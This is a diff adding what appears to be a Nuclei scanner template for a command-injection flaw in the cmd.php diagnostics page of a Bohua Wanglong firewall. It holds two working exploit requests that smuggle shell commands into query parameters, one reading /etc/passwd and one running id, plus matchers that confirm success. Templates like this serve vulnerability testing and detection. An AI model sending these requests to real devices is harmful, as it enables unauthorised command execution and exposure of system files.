@@ -1,0 +1,30 @@
+id: bohuawanglong-cmd-php-rce
+
+info:
+  name: 博华网龙防火墙 cmd.php 远程命令执行漏洞(OEM)
+  author: SleepingBag945
+  severity: critical
+  description: |-
+    博华网龙防火墙 cmd.php 过滤不足，导致命令拼接执行远程命令
+  reference:
+    - https://peiqi.wgpsec.org/wiki/iot/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99%20cmd.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+  tags: rce
+
+http:
+  - raw:
+      - |
+        GET /diagnostics/cmd.php?action=arping&ifName=|cat /etc/passwd|| HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        GET /diagnostics/cmd.php?action=ping&count=||id|| HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200 && regex('root:.*:0', body_1)
+          - status_code_2==200 && regex("uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)", body_2)
+        condition: or
